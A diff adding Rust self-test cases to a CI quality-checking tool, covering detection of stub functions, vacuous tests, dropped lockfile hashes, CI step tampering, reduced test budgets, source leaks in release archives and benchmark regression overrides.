+                    "static int *f(int a) { abort(); }\nint g(int fd) { (void)write(fd, \"x\", 1); (void)fd; return 1; }\n",
+                    &v,
+                )?;
+            Ok(facts.functions.len() == 2
+                && facts.functions[0].name == "f"
+                && matches!(facts.functions[0].shape, BodyShape::Stub(_))
+                && facts.swallowed.len() == 1
+                && facts.swallowed[0].kind == "discarded-result")
+        },
+    ),
+    (
+        "vacuous-tests: an assertion under `if false` counts 0, one under a real condition counts",
+        || {
+            let v = AssertVocabulary::default();
+            let dead = analyze("#[test] fn t() { if false { assert_eq!(f(), 1); } }", &v)?.tests;
+            let live = analyze("#[test] fn t() { if g() { assert_eq!(f(), 1); } }", &v)?.tests;
+            Ok(dead[0].total_asserts == 0 && live[0].total_asserts == 1)
+        },
+    ),
+    (
+        "vacuous-tests: an assertion after an unconditional `return` counts 0",
+        || {
+            let v = AssertVocabulary::default();
+            let dead = analyze("#[test] fn t() { return; assert_eq!(f(), 1); }", &v)?.tests;
+            let live = analyze("#[test] fn t() { if g() { return; } assert_eq!(f(), 1); }", &v)?.tests;
+            Ok(dead[0].total_asserts == 0 && live[0].total_asserts == 1)
+        },
+    ),
+    (
+        "merged-pr-body: a merged pull request is found for a commit, a direct push is not",
+        || {
+            use crate::forge::{merged_pull_for_commit, CannedApi, Forge, ForgeKind};
+            let forge = Forge {
+                kind: ForgeKind::GitHub,
+                url: "https://github.com".into(),
+                repo: "o/r".into(),
+            };
+            let mut api = CannedApi::default();
+            api.responses.insert(
+                "github:repos/o/r/commits/aaa/pulls".into(),
+                serde_json::json!([{"number": 4, "merged_at": "2026-01-01T00:00:00Z", "user": {"login": "a"}, "body": "removes: x y", "head": {"sha": "h"}}]),
+            );
+            api.responses.insert("github:repos/o/r/commits/bbb/pulls".into(), serde_json::json!([]));
+            let found = merged_pull_for_commit(&api, &forge, "aaa").map_err(|e| anyhow::anyhow!(e))?;
+            let none = merged_pull_for_commit(&api, &forge, "bbb").map_err(|e| anyhow::anyhow!(e))?;
+            Ok(found.is_some_and(|p| p.number == 4) && none.is_none())
+        },
+    ),
+    (
+        "dependency-delta: pnpm, uv and Gemfile lockfiles are read; a dropped hash is a finding",
+        || {
+            use crate::guards::lockfile::{diff_lock, parse_lock};
+            let pnpm_base = parse_lock("pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  a@1.0.0:\n    resolution: {integrity: sha512-x}\n")
+                .ok_or_else(|| anyhow::anyhow!("pnpm not read"))?;
+            let pnpm_head = parse_lock("pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  a@1.0.0:\n    resolution: {}\n")
+                .ok_or_else(|| anyhow::anyhow!("pnpm not read"))?;
+            let uv = parse_lock("uv.lock", "[[package]]\nname = \"a\"\nversion = \"1\"\nsource = { registry = \"https://pypi.org/simple\" }\nsdist = { url = \"https://x/a.tar.gz\", hash = \"sha256:x\" }\n")
+                .ok_or_else(|| anyhow::anyhow!("uv not read"))?;
+            let gem = parse_lock("Gemfile.lock", "GEM\n  remote: https://rubygems.org/\n  specs:\n    rake (13.0.6)\n")
+                .ok_or_else(|| anyhow::anyhow!("gemfile not read"))?;
+            let dropped = diff_lock(&pnpm_base, &pnpm_head);
+            Ok(pnpm_base.len() == 1
+                && pnpm_base[0].has_hash
+                && dropped.iter().any(|f| f.title == "Lockfile Integrity Hash Dropped")
+                && uv[0].has_hash
+                && gem[0].name == "rake"
+                && !gem[0].has_hash)
+        },
+    ),
+    (
+        "stub-bodies: a stub padded with a log line is a stub, one preceded by a call is not",
+        || {
+            use crate::ast::functions::BodyShape;
+            let v = AssertVocabulary::default();
+            let padded = analyze("fn f() { log::warn!(\"todo\"); todo!() }", &v)?.functions;
+            let real = analyze("fn f() { init(); todo!() }", &v)?.functions;
+            Ok(matches!(padded[0].shape, BodyShape::Stub(_))
+                && matches!(real[0].shape, BodyShape::Substantive))
+        },
+    ),
+    (
+        "error-swallowing: a handler that only logs swallows, one that logs and re-raises does not",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("pkg/a.py")
+                .ok_or_else(|| anyhow::anyhow!("no python pack"))?;
+            let logs = pack
+                .extract("pkg/a.py", "def f():\n    try:\n        g()\n    except E as e:\n        log.error(e)\n", &v)?
+                .swallowed;
+            let acts = pack
+                .extract("pkg/a.py", "def f():\n    try:\n        g()\n    except E as e:\n        log.error(e)\n        raise\n", &v)?
+                .swallowed;
+            Ok(logs.len() == 1 && logs[0].kind == "logging-handler" && acts.is_empty())
+        },
+    ),
+    (
+        "unsafe-safety-comment: a `# Safety` rustdoc section documents an unsafe trait",
+        || {
+            let v = AssertVocabulary::default();
+            let documented = analyze("/// # Safety\n/// Rules.\npub unsafe trait T {}", &v)?;
+            let bare = analyze("/// Rules.\npub unsafe trait T {}", &v)?;
+            Ok(documented.unsafe_sites[0].documented && !bare.unsafe_sites[0].documented)
+        },
+    ),
+    (
+        "provenance-tags: a configured artifact form satisfies a ratio, an unlisted path does not",
+        || {
+            use crate::guards::provenance_tags::interval_evidence_regex;
+            let re = interval_evidence_regex(&["artifact:results/baseline_*".into()])?
+                .ok_or_else(|| anyhow::anyhow!("no pattern"))?;
+            Ok(re.is_match("see results/baseline_a.json") && !re.is_match("see results/x.json"))
+        },
+    ),
+    (
+        "ci-integrity: advisory is read from the flag, not from a comment",
+        || {
+            use crate::guards::ci_integrity::run_is_advisory;
+            Ok(run_is_advisory("discipline check --advisory")
+                && !run_is_advisory("# never pass --advisory to discipline check\ndiscipline check"))
         },
     ),
     (
@@ -491,6 +1338,34 @@ const CASES: &[Case] = &[
     ),
     #[cfg(feature = "lang-python")]
     (
+        "python: a same-file helper that raises is an assertion, resolved one level",
+        || {
+            use crate::ast::LanguagePack;
+            let py_pack = crate::ast::python::PythonPack;
+            let vocab = AssertVocabulary::default();
+            let src = "def check(x):\n    if x != 1:\n        raise AssertionError(x)\n\ndef outer(x):\n    check(x)\n\ndef test_direct():\n    check(f())\n\ndef test_nested():\n    outer(f())\n";
+            let facts = py_pack.extract("tests/test_mod.py", src, &vocab)?;
+            let by = |n: &str| facts.tests.iter().find(|t| t.name == n);
+            Ok(by("test_direct").is_some_and(|t| t.total_asserts == 1)
+                && by("test_nested").is_some_and(|t| t.total_asserts == 0))
+        },
+    ),
+    #[cfg(feature = "lang-python")]
+    (
+        "python: only pytest/unittest-collected names are tests (`self_test` is not)",
+        || {
+            use crate::ast::LanguagePack;
+            let py_pack = crate::ast::python::PythonPack;
+            let vocab = AssertVocabulary::default();
+            let src = "import unittest\n\ndef self_test():\n    assert f() == 1\n\ndef test_a():\n    assert f() == 1\n\nclass TestB:\n    def test_b(self):\n        assert f() == 1\n\nclass C(unittest.TestCase):\n    def testC(self):\n        self.assertEqual(f(), 1)\n\nclass Helper:\n    def test_h(self):\n        assert f() == 1\n";
+            let facts = py_pack.extract("pkg/mod.py", src, &vocab)?;
+            let mut names: Vec<&str> = facts.tests.iter().map(|t| t.name.as_str()).collect();
+            names.sort_unstable();
+            Ok(names == ["C::testC", "TestB::test_b", "test_a"])
+        },
+    ),
+    #[cfg(feature = "lang-python")]
+    (
         "python: context manager assertions and class/module pytestmark skips are detected",
         || {
             use crate::ast::LanguagePack;
@@ -678,6 +1553,18 @@ const CASES: &[Case] = &[
     ),
     #[cfg(feature = "lang-csharp")]
     (
+        "csharp: tests are discovered by attribute, not by a `Test*` method name",
+        || {
+            use crate::ast::LanguagePack;
+            let pack = crate::ast::csharp::CSharpPack;
+            let vocab = AssertVocabulary::default();
+            let src = "public class T {\n    public bool TestConnection() { return true; }\n    [Xunit.Fact]\n    public void Works() { Assert.Equal(1, 1 + 0); }\n}\n";
+            let facts = pack.extract("tests/T.cs", src, &vocab)?;
+            Ok(facts.tests.len() == 1 && facts.tests[0].name == "Works")
+        },
+    ),
+    #[cfg(feature = "lang-csharp")]
+    (
         "csharp: xUnit extraction catches assertions, vacuous tests, and Fact(Skip = ...)",
         || {
             use crate::ast::LanguagePack;
@@ -706,6 +1593,24 @@ const CASES: &[Case] = &[
             Ok(strong_facts.tests[0].strong_asserts == 2
                 && weak_facts.tests[0].strong_asserts == 0
                 && weak_facts.tests[0].total_asserts == 2)
+        },
+    ),
+    #[cfg(feature = "lang-kotlin")]
+    (
+        "kotlin: JUnit and Kotest extraction catches assertions, vacuous tests, and skips",
+        || {
+            use crate::ast::LanguagePack;
+            let pack = crate::ast::kotlin::KotlinPack;
+            let vocab = AssertVocabulary::default();
+            let src = "class CalcTest {\n    @Test\n    fun one() {\n        assertEquals(1, 2)\n    }\n    @Test\n    fun two() {\n        assertTrue(true)\n    }\n    @Disabled\n    @Test\n    fun three() {\n        assertEquals(1, 2)\n    }\n}\nclass S : StringSpec({\n    \"adds\" { (1 + 1) shouldBe 2 }\n    \"!off\" { 1 shouldBe 2 }\n})\n";
+            let facts = pack.extract("src/test/kotlin/CalcTest.kt", src, &vocab)?;
+            Ok(facts.tests.len() == 5
+                && facts.tests[0].strong_asserts == 1
+                && !facts.tests[0].is_vacuous()
+                && facts.tests[1].is_vacuous()
+                && facts.tests[2].ignored
+                && facts.tests[3].strong_asserts == 1
+                && facts.tests[4].ignored)
         },
     ),
     #[cfg(feature = "lang-ruby")]
@@ -968,15 +1873,13 @@ allow-git = [
     (
         "test-budget: proptest, quickcheck, hypothesis, and fast-check budget reductions are detected",
         || {
-            use crate::guards::test_budget::{
-                extract_js_budgets, extract_python_budgets, extract_rust_budgets,
-            };
+            use crate::guards::test_budget::extract_budgets_for_file;
 
             // 1. Rust proptest and quickcheck reduction
-            let base_rs = "let c = ProptestConfig { cases: 5000, max_shrink_iters: 2000, ..Default::default() };\nQuickCheck::new().tests(500);";
-            let head_rs = "let c = ProptestConfig { cases: 500, max_shrink_iters: 200, ..Default::default() };\nQuickCheck::new().tests(50);";
-            let base_rust = extract_rust_budgets(base_rs, "tests/prop.rs");
-            let head_rust = extract_rust_budgets(head_rs, "tests/prop.rs");
+            let base_rs = "fn f() { let c = ProptestConfig { cases: 5000, max_shrink_iters: 2000, ..Default::default() };\nQuickCheck::new().tests(500); }";
+            let head_rs = "fn f() { let c = ProptestConfig { cases: 500, max_shrink_iters: 200, ..Default::default() };\nQuickCheck::new().tests(50); }";
+            let base_rust = extract_budgets_for_file(base_rs, "tests/prop.rs");
+            let head_rust = extract_budgets_for_file(head_rs, "tests/prop.rs");
 
             let cases_drop = base_rust.iter().find(|m| m.subject == "proptest cases").unwrap().value
                 > head_rust.iter().find(|m| m.subject == "proptest cases").unwrap().value;
@@ -988,8 +1891,8 @@ allow-git = [
             // 2. Python Hypothesis reduction
             let base_py = "@settings(max_examples=1000, deadline=500)\ndef test_h(): pass";
             let head_py = "@settings(max_examples=100, deadline=50)\ndef test_h(): pass";
-            let base_python = extract_python_budgets(base_py, "test_h.py");
-            let head_python = extract_python_budgets(head_py, "test_h.py");
+            let base_python = extract_budgets_for_file(base_py, "test_h.py");
+            let head_python = extract_budgets_for_file(head_py, "test_h.py");
 
             let hypo_examples_drop = base_python.iter().find(|m| m.subject == "hypothesis max_examples").unwrap().value
                 > head_python.iter().find(|m| m.subject == "hypothesis max_examples").unwrap().value;
@@ -999,12 +1902,27 @@ allow-git = [
             // 3. JS fast-check reduction
             let base_js = "fc.assert(prop, { numRuns: 1000 });";
             let head_js = "fc.assert(prop, { numRuns: 100 });";
-            let base_fc = extract_js_budgets(base_js, "test.js");
-            let head_fc = extract_js_budgets(head_js, "test.js");
+            let base_fc = extract_budgets_for_file(base_js, "test.js");
+            let head_fc = extract_budgets_for_file(head_js, "test.js");
 
             let fc_drop = base_fc[0].value > head_fc[0].value;
 
             Ok(cases_drop && shrink_drop && qc_drop && hypo_examples_drop && hypo_deadline_drop && fc_drop)
+        },
+    ),
+    (
+        "test-budget: a budget in a string or a comment is not a budget, one in a config position is",
+        || {
+            use crate::guards::test_budget::extract_budgets_for_file;
+            let quoted = extract_budgets_for_file(
+                "fn f() { let s = \"cases: 10\"; // max_shrink_iters: 5\n let min_tests = 40; }",
+                "tests/e2e.rs",
+            );
+            let real = extract_budgets_for_file(
+                "fn f() { let c = ProptestConfig::with_cases(10); }",
+                "tests/prop.rs",
+            );
+            Ok(quoted.is_empty() && real.len() == 1 && real[0].value == 10)
         },
     ),
     (
@@ -1174,9 +2092,12 @@ command = "cargo test"
                 base: "main".into(),
                 errors: 1,
                 warnings: 0,
+                notes: 0,
                 overrides: 0,
+                baselined: 0,
                 outcomes: vec![o],
                 planned_gates: vec![],
+                policy_failures: Vec::new(),
             };
 
             let prompt = format_agent_prompt(&summary);
@@ -1463,6 +2384,71 @@ jobs:
         },
     ),
     (
+        "ci-integrity: renamed step pairs by run body, renamed-and-rewritten step does not",
+        || {
+            use crate::guards::ci_integrity::{pair_steps, StepMatch};
+            let seq = |y: &str| -> Result<Vec<serde_yaml::Value>> {
+                Ok(serde_yaml::from_str::<Vec<serde_yaml::Value>>(y)?)
+            };
+            let base = seq("- name: Lint a.sh b.sh\n  run: |\n    ./a.sh\n    ./b.sh\n")?;
+            let renamed = seq("- name: Lint scripts\n  run: |\n    ./a.sh\n    ./b.sh\n")?;
+            let rewritten = seq("- name: Lint scripts\n  run: echo skipped\n")?;
+            let is_rename = matches!(
+                pair_steps(&base, &renamed)[0],
+                Some(StepMatch::Renamed { head: 0, .. })
+            );
+            Ok(is_rename && pair_steps(&base, &rewritten)[0].is_none())
+        },
+    ),
+    (
+        "ci-skip-set: skip under a true `if:` is caught, a consistent skip set passes",
+        || {
+            use crate::guards::ci_skip_set::{check_skip_set, FindingKind, SkipSetSpec};
+            use std::collections::BTreeMap;
+            let workflow = "
+jobs:
+  detect-changes:
+    runs-on: ubuntu-latest
+  miri:
+    needs: detect-changes
+    if: needs.detect-changes.outputs.rust-src == 'true' || contains(needs.detect-changes.outputs.changed-jobs, '|miri|')
+";
+            let github = BTreeMap::from([("event_name".to_string(), "pull_request".to_string())]);
+            let spec = SkipSetSpec {
+                change_job: Some("detect-changes"),
+                unconditional_jobs: &[],
+                github: &github,
+            };
+            let ctx = |miri: &str| {
+                format!(
+                    r#"{{"detect-changes":{{"result":"success","outputs":{{"rust-src":"false","changed-jobs":"|miri|"}}}},"miri":{{"result":"{miri}","outputs":{{}}}}}}"#
+                )
+            };
+            let consistent = check_skip_set(workflow, &ctx("success"), &spec)?;
+            let narrowed = check_skip_set(workflow, &ctx("skipped"), &spec)?;
+            Ok(consistent.findings.is_empty()
+                && narrowed.findings.len() == 1
+                && narrowed.findings[0].kind == FindingKind::SkippedWhileGateTrue)
+        },
+    ),
+    (
+        "time-estimates: allow_pattern spans a soft wrap and binds to its match",
+        || {
+            use crate::guards::hygiene::scan_text_for_time_estimates;
+            let banned: Vec<Regex> = time_estimate_patterns()
+                .iter()
+                .map(|p| Regex::new(p))
+                .collect::<Result<_, _>>()?;
+            let allowed = vec![Regex::new("one-minute load average")?];
+            let wrapped = "The run held the one-minute load\naverage below 1.5.\n";
+            let mixed = "The run held the one-minute load\naverage below 1.5, so we ship in 3 weeks.\n";
+            Ok(!scan_text_for_time_estimates(wrapped, &banned, &[]).is_empty()
+                && scan_text_for_time_estimates(wrapped, &banned, &allowed).is_empty()
+                && scan_text_for_time_estimates(mixed, &banned, &allowed)
+                    == vec![(2, "3 weeks".to_string())])
+        },
+    ),
+    (
         "bench-regression: iai console parsing, two-tier threshold, and sourced overrides",
         || {
             use crate::config::{BenchRegressionGate, Severity};
@@ -1564,22 +2550,37 @@ smoke_cost::set_contains
             )?;
             let fail_ok = out2.violations.len() == 2;
 
-            // Sourced override naming map_get: approved for map_get, map_insert fails
+            // Sourced override naming map_get, citing a run verified fresh (completed at
+            // the head under review): approved for map_get, map_insert fails
             let dirs = vec![ParsedDirective {
                 directive: "allow-regression".to_string(),
-                reason: "map_get trade refs https://github.com/orieg/expanse/actions/runs/34490311084".to_string(),
+                reason: "map_get trade refs https://github.com/acme/widgets/actions/runs/4401"
+                    .to_string(),
                 source: OverrideSource::PrBody,
                 hidden: false,
             }];
+            let fresh = crate::guards::perf::citation::CannedInstruments {
+                responses: std::collections::BTreeMap::from([
+                    (
+                        "repos/acme/widgets/actions/runs/4401".to_string(),
+                        serde_json::json!({"conclusion": "success", "head_sha": "abc123"}),
+                    ),
+                    (
+                        "repos/acme/widgets/compare/abc123...abc123".to_string(),
+                        serde_json::json!({"status": "identical"}),
+                    ),
+                ]),
+                head: Some("abc123".to_string()),
+                ..Default::default()
+            };
             let mut out3 = GateOutcome::new("bench-regression");
-            evaluate_metrics_regression_with_directives(
+            crate::guards::perf::evaluate_metrics_regression_with_instruments(
                 &dirs,
                 &settings,
-                &base_metrics,
-                &head_fail,
-                "base.txt",
-                "head.txt",
+                (&base_metrics, &head_fail),
+                ("base.txt", "head.txt"),
                 Severity::Error,
+                &fresh,
                 &mut out3,
             )?;
             let override_subset_ok = out3.overrides.len() == 1 && out3.violations.len() == 1;
@@ -1627,6 +2628,87 @@ smoke_cost::set_contains
         },
     ),
     (
+        "provenance-tags: superseded-figure registry and pending-measurement issue citations",
+        || {
+            use crate::guards::claim_registry::{
+                load_registry, scan_pending, scan_superseded, IssueStates, PendingProblem,
+            };
+            let lines = |t: &str| -> Vec<(usize, String)> {
+                t.lines().enumerate().map(|(i, l)| (i + 1, l.to_string())).collect()
+            };
+            let reg = load_registry(
+                r#"{"figures": [{"id": "f", "patterns": ["(?<![\\w.])1\\.11\\s*x"], "context": ["lookup", "stock"]}]}"#,
+                "reg.json",
+            )?;
+            let bare = scan_superseded(&lines("Stock lookup is 1.11x slower."), &reg)?;
+            let marked = scan_superseded(&lines("Stock lookup was 1.11x slower (retracted)."), &reg)?;
+            let other_number = scan_superseded(&lines("Stock lookup is 21.11x slower."), &reg)?;
+            let broken_registry = load_registry(r#"{"figures": [{"id": "a", "patterns": ["("]}]}"#, "r").is_err();
+
+            let (uncited, _) = scan_pending(&lines("B is pending re-run."), None);
+            // Gitea's issue vocabulary, as recorded from a live instance.
+            let forge = crate::forge::Forge {
+                kind: crate::forge::ForgeKind::Gitea,
+                url: "https://git.example.com".into(),
+                repo: "o/r".into(),
+            };
+            let mut canned = crate::forge::CannedApi::default();
+            canned
+                .responses
+                .insert("gitea:repos/o/r/issues/1".into(), serde_json::json!({"state": "closed"}));
+            let mut states = IssueStates::new(&canned, Ok(forge.clone()));
+            let (closed, _) = scan_pending(&lines("B is pending re-run (#1)."), Some(&mut states));
+            let mut blind = IssueStates::new(&crate::forge::NoApi, Ok(forge));
+            let (_, undecided) = scan_pending(&lines("B is pending re-run (#1)."), Some(&mut blind));
+
+            Ok(bare.len() == 1
+                && marked.is_empty()
+                && other_number.is_empty()
+                && broken_registry
+                && uncited == vec![(1, PendingProblem::NoCitation)]
+                && matches!(closed.as_slice(), [(1, PendingProblem::Closed(_))])
+                && undecided.len() == 1)
+        },
+    ),
+    (
+        "doctor: a required check must run discipline; could-not-check is never healthy",
+        || {
+            use crate::doctor::{analyse_workflows, protection_findings, Protection, Status};
+            let wf = "on:\n  pull_request:\n    types: [opened, synchronize, reopened, edited]\npermissions: read-all\njobs:\n  d:\n    steps: [{uses: orieg/discipline@v0}]\n  ci-gate:\n    if: always()\n    needs: d\n    steps:\n      - run: test \"${{ needs.d.result }}\" = success\n";
+            let jobs = analyse_workflows(&[("ci.yml".to_string(), wf.to_string())], false).jobs;
+            let mut p = Protection {
+                strict: true,
+                force_push_blocked: true,
+                deletion_blocked: true,
+                pull_request_required: true,
+                bypass: Some(Vec::new()),
+                ..Protection::default()
+            };
+            p.required_contexts.insert("ci-gate".to_string());
+            let good = protection_findings(crate::forge::ForgeKind::GitHub, &p, &jobs);
+            p.required_contexts = ["lint".to_string()].into_iter().collect();
+            let wrong = protection_findings(crate::forge::ForgeKind::GitHub, &p, &jobs);
+            let required = |f: &[crate::doctor::Finding]| {
+                f.iter().find(|x| x.id == "required-check").map(|x| x.status)
+            };
+            let unknown = crate::doctor::Report {
+                platform: "t".into(),
+                forge_url: None,
+                repository: None,
+                branch: None,
+                findings: vec![crate::doctor::Finding {
+                    id: "platform",
+                    status: Status::Unknown,
+                    summary: String::new(),
+                    remediation: None,
+                }],
+            };
+            Ok(required(&good) == Some(Status::Pass)
+                && required(&wrong) == Some(Status::Fail)
+                && unknown.exit_code(false) == 2)
+        },
+    ),
+    (
         "presets: cargo-public-api, miri, and sanitizers preset resolution",
         || {
             use crate::guards::presets::resolve_preset;
@@ -1641,14 +2723,700 @@ smoke_cost::set_contains
             Ok(api_ok && miri_ok && san_ok)
         },
     ),
+    (
+        "archive-contents: detects missing required paths and forbidden entry leaks",
+        || {
+            use crate::guards::archive_contents::read_archive_entries;
+            use flate2::write::GzEncoder;
+            use flate2::Compression;
+            use std::fs::File;
+
+            let temp_path = std::env::temp_dir().join(format!("discipline_selftest_{}.tgz", std::process::id()));
+            let f = File::create(&temp_path)?;
+            let enc = GzEncoder::new(f, Compression::default());
+            let mut tar = tar::Builder::new(enc);
+
+            let data = b"content";
+            let mut h1 = tar::Header::new_gnu();
+            h1.set_size(data.len() as u64);
+            h1.set_mode(0o644);
+            h1.set_cksum();
+            tar.append_data(&mut h1, "Judy-2.6.0/config.m4", &data[..])?;
+
+            let mut h2 = tar::Header::new_gnu();
+            h2.set_size(data.len() as u64);
+            h2.set_mode(0o644);
+            h2.set_cksum();
+            tar.append_data(&mut h2, "Judy-2.6.0/tools/check.sh", &data[..])?;
+            let enc = tar.into_inner()?;
+            enc.finish()?;
+
+            let entries = read_archive_entries(&temp_path, 1);
+            let _ = std::fs::remove_file(&temp_path);
+            let entries = entries?;
+            let has_required = entries.contains(&"config.m4".to_string());
+            let missing_required = !entries.contains(&"example_ext.h".to_string());
+
+            let forbidden_re = Regex::new(r"^tools/")?;
+            let has_forbidden = entries.iter().any(|e| forbidden_re.is_match(e));
+            let clean_entry_safe = !forbidden_re.is_match("config.m4");
+
+            Ok(has_required && missing_required && has_forbidden && clean_entry_safe)
+        },
+    ),
+    (
+        "archive-contents: reads wheel, deb, rpm and gem by magic bytes and refuses a disk image",
+        || {
+            use crate::guards::archive_contents::read_archive_entries;
+            use crate::guards::archive_formats::fixtures;
+
+            let dir = std::env::temp_dir().join(format!("discipline_selftest_formats_{}", std::process::id()));
+            std::fs::create_dir_all(&dir)?;
+            let files: &[(&str, &[u8])] = &[("pkg/tools/leak.sh", b"x")];
+            let cases: Vec<(&str, Vec<u8>, &str)> = vec![
+                ("a-1.0-py3-none-any.whl", fixtures::zip(files), "pkg/tools/leak.sh"),
+                ("a_1.0_all.deb", fixtures::deb("data.tar.xz", &fixtures::xz(&fixtures::tar(files))), "pkg/tools/leak.sh"),
+                ("a-1.0-1.noarch.rpm", fixtures::rpm(&fixtures::zstd(&fixtures::cpio_newc(files))), "pkg/tools/leak.sh"),
+                ("a-1.0.gem", fixtures::gem(files), "data/pkg/tools/leak.sh"),
+                ("a-release", fixtures::gzip(&fixtures::tar(files)), "pkg/tools/leak.sh"),
+            ];
+            let mut all_read = true;
+            for (name, bytes, want) in cases {
+                let path = dir.join(name);
+                std::fs::write(&path, bytes)?;
+                all_read &= read_archive_entries(&path, 0).map(|e| e.iter().any(|n| n == want)).unwrap_or(false);
+            }
+            let dmg = dir.join("a.dmg");
+            std::fs::write(&dmg, b"anything")?;
+            let refused = read_archive_entries(&dmg, 0)
+                .map_err(|e| format!("{e:#}"))
+                .err()
+                .is_some_and(|e| e.contains("Apple disk image") && e.contains("not analysed"));
+            let mismatch = dir.join("a.tar.gz");
+            std::fs::write(&mismatch, fixtures::zip(files))?;
+            let not_guessed = read_archive_entries(&mismatch, 0).is_err();
+            std::fs::remove_dir_all(&dir)?;
+            Ok(all_read && refused && not_guessed)
+        },
+    ),
+    (
+        "archive-contents: the content scan finds sourcesContent in a .map and in an inline base64 map",
+        || {
+            use crate::guards::archive_contents::read_archive;
+            use crate::guards::archive_formats::fixtures;
+            use base64::Engine as _;
+
+            let leaking = r#"{"version":3,"sources":["../src/cli.ts"],"sourcesContent":["let x = 1;\n"],"mappings":"AAAA"}"#;
+            let plain = r#"{"version":3,"sources":["../src/cli.ts"],"mappings":"AAAA"}"#;
+            let inline = format!(
+                "run();\n//# sourceMappingURL=data:application/json;base64,{}\n",
+                base64::engine::general_purpose::STANDARD.encode(leaking)
+            );
+            let tgz = fixtures::gzip(&fixtures::tar(&[
+                ("package/dist/cli.js.map", leaking.as_bytes()),
+                ("package/dist/inline.js", inline.as_bytes()),
+                ("package/dist/plain.js.map", plain.as_bytes()),
+            ]));
+            let path = std::env::temp_dir().join(format!("discipline_selftest_scan_{}.tgz", std::process::id()));
+            std::fs::write(&path, tgz)?;
+            let scanned = read_archive(&path, 1, Some(1 << 20));
+            let capped = read_archive(&path, 1, Some(16));
+            std::fs::remove_file(&path)?;
+            let scan = scanned?.scan.unwrap_or_default();
+            let leaks: Vec<(&str, bool)> = scan.leaks.iter().map(|l| (l.entry.as_str(), l.inline)).collect();
+            let found = leaks == [("dist/cli.js.map", false), ("dist/inline.js", true)]
+                && scan.maps_without_source == ["dist/plain.js.map"];
+            let capped = capped?.scan.unwrap_or_default();
+            let cap_named = capped.leaks.is_empty() && capped.oversized.len() == 3;
+            Ok(found && cap_named)
+        },
+    ),
+    (
+        "archive-contents: no-source presets forbid source by ecosystem and keep .d.ts",
+        || {
+            use crate::guards::archive_contents::forbidden_rules;
+            use crate::guards::archive_presets::resolve;
+
+            let forbids = |preset: &str, entry: &str| -> Result<bool> {
+                let preset = resolve(preset).ok_or_else(|| anyhow::anyhow!("no preset {preset}"))?;
+                Ok(forbidden_rules(&[], Some(&preset))?.iter().any(|r| r.matches(entry)))
+            };
+            let npm = forbids("no-source-npm", "package/src/index.ts")?
+                && forbids("no-source-npm", "package/dist/index.ts")?
+                && !forbids("no-source-npm", "package/dist/index.d.ts")?
+                && forbids("no-source-npm", "package/dist/index.d.ts.map")?;
+            let python = !forbids("no-source-python", "pkg-1.0/src/pkg/__init__.py")?
+                && forbids("no-source-python", "pkg-1.0/.env")?;
+            let dotnet = forbids("no-source-dotnet", "lib/net8.0/Example.pdb")?;
+            let all = resolve("no-source").is_some_and(|p| p.scan_contents)
+                && forbids("no-source", "com/example/App.java")?;
+            Ok(npm && python && dotnet && all && resolve("no-sources").is_none())
+        },
+    ),
+    (
+        "manifest-sync: extracts declared paths and reconciles bidirectional diffs",
+        || {
+            let manifest_xml = r#"
+            <package>
+                <contents>
+                    <file name="tests/001.phpt" role="test"/>
+                    <file name="tests/ghost.phpt" role="test"/>
+                </contents>
+            </package>"#;
+
+            let re = Regex::new(r#"<file\s+name="([^"]+)""#)?;
+            let manifest_files: std::collections::BTreeSet<String> = re
+                .captures_iter(manifest_xml)
+                .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
+                .collect();
+
+            let git_files = ["tests/001.phpt".to_string(), "tests/unmanifested.phpt".to_string()];
+
+            let unmanifested: Vec<_> = git_files
+                .iter()
+                .filter(|f| !manifest_files.contains(*f))
+                .cloned()
+                .collect();
+            let ghost: Vec<_> = manifest_files
+                .iter()
+                .filter(|f| !git_files.contains(f))
+                .cloned()
+                .collect();
+
+            Ok(unmanifested == vec!["tests/unmanifested.phpt"] && ghost == vec!["tests/ghost.phpt"])
+        },
+    ),
+    (
+        "version-lockstep: verifies multi-source equality and detects mismatch",
+        || {
+            let header = "#define EXAMPLE_EXT_VERSION \"2.6.0\"\n";
+            let manifest_match = "<release>2.6.0</release>";
+            let manifest_mismatch = "<release>2.5.0</release>";
+
+            let h_re = Regex::new(r#"#define\s+EXAMPLE_EXT_VERSION\s+"([^"]+)""#)?;
+            let m_re = Regex::new(r#"<release>([^<]+)</release>"#)?;
+
+            let h_ver = h_re.captures(header).and_then(|c| c.get(1)).map(|m| m.as_str()).unwrap();
+            let m_ver_ok = m_re.captures(manifest_match).and_then(|c| c.get(1)).map(|m| m.as_str()).unwrap();
+            let m_ver_bad = m_re.captures(manifest_mismatch).and_then(|c| c.get(1)).map(|m| m.as_str()).unwrap();
+
+            Ok(h_ver == m_ver_ok && h_ver != m_ver_bad)
+        },
+    ),
+    (
+        "bench-regression: sample array adapter computes bootstrap confidence interval",
+        || {
+            use crate::guards::perf::{parse_metrics, MetricValue};
+
+            let json = r#"{
+                "benchmarks": {
+                    "core.bitset.write.judy": {
+                        "median_ms": 14.5314,
+                        "runs_ms": [14.3895, 14.476, 14.5057, 14.5314, 14.5369, 14.538, 14.5991]
+                    }
+                }
+            }"#;
+
+            let metrics = parse_metrics("baselines/latest.json", json)?;
+            if metrics.len() != 1 {
+                return Ok(false);
+            }
+
+            match &metrics[0].value {
+                MetricValue::Continuous(est) => {
+                    let has_ci = est.ci.is_some();
+                    let ci = est.ci.unwrap();
+                    let valid_bounds = ci.lower <= est.point_estimate && est.point_estimate <= ci.upper;
+                    let valid_unit = est.unit == "ms";
+                    Ok(has_ci && valid_bounds && valid_unit)
+                }
+                _ => Ok(false),
+            }
+        },
+    ),
+    (
+        "bench-regression: exempt_arms globs, printed form, and stale entries discriminate",
+        || {
+            use crate::guards::perf::{report_stale_exempt_arms, ArmExemptions};
+            use crate::guards::GateOutcome;
+
+            let entries = vec!["*.heap.*".to_string(), "map_get random".to_string()];
+            let ex = ArmExemptions::new(&entries)?;
+            let globbed = ex.matches("core.bitset.heap.judy") && ex.matches("core.int_to_int.heap.php");
+            let printed = ex.matches("map_get/random");
+            let untouched = !ex.matches("core.bitset.write.judy") && !ex.matches("map_insert/random");
+            let malformed_rejected = ArmExemptions::new(&["core.[heap".to_string()]).is_err();
+
+            let arms = vec!["map_get/random".to_string(), "core.bitset.heap.judy".to_string()];
+            let mut live = GateOutcome::new("bench-regression");
